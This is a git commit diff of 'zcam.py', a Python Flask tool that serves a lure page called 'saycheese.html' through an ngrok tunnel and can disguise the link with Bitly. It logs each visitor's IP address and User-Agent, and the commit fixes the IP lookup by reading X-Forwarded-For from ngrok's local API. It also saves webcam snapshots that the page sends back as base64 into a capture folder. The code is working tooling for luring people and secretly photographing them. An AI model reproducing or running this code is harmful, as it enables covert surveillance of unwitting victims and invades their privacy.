a6fed2917da59e66997a49bc307902f57d0224d4
ghostinlinux <pratikkumar1701@gmail.com>
2021-09-09 03:32:27 +0530

    Added fstring and fix ip issue

--- zcam.py
+++ zcam.py
@@ -11,95 +11,102 @@ import pyfiglet
 import logging
 import tokensbitly
 import pyshorteners
+import requests
 
-# bitly
-ACCESS_TOKEN= tokensbitly.accessToken
-s = pyshorteners.Shortener(api_key=ACCESS_TOKEN)
+try:
+    # bitly
+    ACCESS_TOKEN= tokensbitly.accessToken
+    s = pyshorteners.Shortener(api_key=ACCESS_TOKEN)
 
-# colors
-class bcolors:
-    HEADER = '\033[95m'
-    OKBLUE = '\033[94m'
-    OKCYAN = '\033[96m'
-    OKGREEN = '\033[92m'
-    WARNING = '\033[93m'
-    FAIL = '\033[91m'
-    ENDC = '\033[0m'
-    BOLD = '\033[1m'
-    UNDERLINE = '\033[4m'
-
-
-# banner 
-result = pyfiglet.figlet_format("Z-CAM")
-print(bcolors.OKBLUE + result + bcolors.ENDC)
-print("                         "+bcolors.BOLD+"Github: @sankethj"+bcolors.ENDC)
-print("")
-
-# disable unwanted logs
-log = logging.getLogger('werkzeug')
-log.setLevel(logging.ERROR)
-
-os.environ["FLASK_ENV"] = "development"
-app = Flask(__name__)
-app.debug = False
-port = 5000
-public_url = ngrok.connect(port).public_url
-final_ngrok = public_url[:4] + "s" + public_url[4:]
-
-# url shorten or not
-shorten = input(bcolors.WARNING + "Do you want to use Bitly to shorten url link? ['y' or 'n']: " + bcolors.ENDC)
-if shorten == 'y' or shorten == 'Y' or shorten == 'Yes' or shorten =='yes':
-    final_ngrok = s.bitly.short(final_ngrok)
-else:
-    final_ngrok = final_ngrok
+    # colors
+    class bcolors:
+        HEADER = '\033[95m'
+        OKBLUE = '\033[94m'
+        OKCYAN = '\033[96m'
+        OKGREEN = '\033[92m'
+        WARNING = '\033[93m'
+        FAIL = '\033[91m'
+        ENDC = '\033[0m'
+        BOLD = '\033[1m'
+        UNDERLINE = '\033[4m'
 
 
-print(" * ngrok tunnel link -> " + bcolors.OKCYAN + final_ngrok + bcolors.ENDC)
-app.config["BASE_URL"] = public_url
+    # banner 
+    result = pyfiglet.figlet_format("Z-CAM")
+    print(f"{bcolors.OKBLUE}{result}{bcolors.ENDC}")
+    print(f"\t\t\t {bcolors.BOLD}Github: @sankethj{bcolors.ENDC}")
+    print("")
 
-# flask
-@app.route("/",methods=['POST','GET'])
-def home():
+    # disable unwanted logs
+    log = logging.getLogger('werkzeug')
+    log.setLevel(logging.ERROR)
 
-    # get request
-    if request.method == 'GET':
-        now = str(datetime.now())
-        user_agent = request.headers.get('User-Agent')
-        ip_address = request.remote_addr
+    os.environ["FLASK_ENV"] = "development"
+    app = Flask(__name__)
+    app.debug = False
+    port = 5000
+    public_url = ngrok.connect(port).public_url
+    final_ngrok = public_url[:4] + "s" + public_url[4:]
 
-        # writing file
-        file1 = open('myfile.txt', 'a')
-        file1.write("Date and Time:\t")
-        file1.write(str(now))
-        file1.write("\nIP:\t")
-        file1.write(str(ip_address))
-        file1.write("\nUser-Agent:\t")
-        file1.write(str(user_agent))
-        file1.write("\n\n")
-        file1.close()
+    # url shorten or not
+    shorten = input(f"{bcolors.WARNING}Do you want to use Bitly to shorten url link? ['y' or 'n']:{bcolors.ENDC}")
+    if shorten == 'y' or shorten == 'Y' or shorten == 'Yes' or shorten =='yes':
+        final_ngrok = s.bitly.short(final_ngrok)
+    else:
+        final_ngrok = final_ngrok
 
-        print(now+'     '+ bcolors.OKCYAN + ip_address + bcolors.ENDC +'      '+user_agent+'     ')
 
-    # post request
-    elif request.method == 'POST':
-        now = str(datetime.now())
+    print(f" * ngrok tunnel link ->   {bcolors.OKCYAN}{final_ngrok}{bcolors.ENDC}")
+    app.config["BASE_URL"] = public_url
 
-        # setting path to save file in capture dir
-        save_path = 'capture'
-        file_name = 'img_'+now+'.png'
-        completeName = os.path.join(save_path, file_name)
+    # flask
+    @app.route("/",methods=['POST','GET'])
+    def home():
 
-        # requesting base64 image data 
-        req_data = request.get_json() 
-        encoded = req_data['canvasData']
+        # get request
+        if request.method == 'GET':
+            now = str(datetime.now())
+            req = requests.get('http://localhost:4040/api/requests/http').json()
+            user_agent = req['requests'][0]['request']['headers']['User-Agent'][0]        
+            ip_address = req['requests'][0]['request']['headers']['X-Forwarded-For'][0]
 
-        # writing file
-        file2 = open(completeName, 'wb')
-        data = base64.b64decode(encoded)
-        file2.write(data)
-        file2.close()
-        print(bcolors.OKGREEN + "[" + bcolors.ENDC + "+" + bcolors.OKGREEN + "] Cam image recieved." + bcolors.FAIL + "\n")
-    return render_template("saycheese.html")
-    
-# threading to run flask with pyngrok smoothly
-threading.Thread(target=app.run, kwargs={"use_reloader": False}).start()
+
+            # writing file
+            file1 = open('myfile.txt', 'a')
+            file1.write("Date and Time:\t")
+            file1.write(str(now))
+            file1.write("\nIP:\t")
+            file1.write(str(ip_address))
+            file1.write("\nUser-Agent:\t")
+            file1.write(str(user_agent))
+            file1.write("\n\n")
+            file1.close()
+
+            print(f"{now} \t {bcolors.OKCYAN}{ip_address}{bcolors.ENDC} \t {user_agent}\t")
+
+        # post request
+        elif request.method == 'POST':
+            now = str(datetime.now())
+
+            # setting path to save file in capture dir
+            save_path = 'capture'
+            file_name = 'img_'+now+'.png'
+            completeName = os.path.join(save_path, file_name)
+
+            # requesting base64 image data 
+            req_data = request.get_json() 
+            encoded = req_data['canvasData']
+
+            # writing file
+            file2 = open(completeName, 'wb')
+            data = base64.b64decode(encoded)
+            file2.write(data)
+            file2.close()
+            print(f"{bcolors.OKGREEN}[{bcolors.ENDC}+{bcolors.OKGREEN}] Cam image recieved.{bcolors.FAIL} \n ")
+        return render_template("saycheese.html")
+        
+    # threading to run flask with pyngrok smoothly
+    threading.Thread(target=app.run, kwargs={"use_reloader": False}).start()
+
+except KeyboardInterrupt:
+    print("End task")
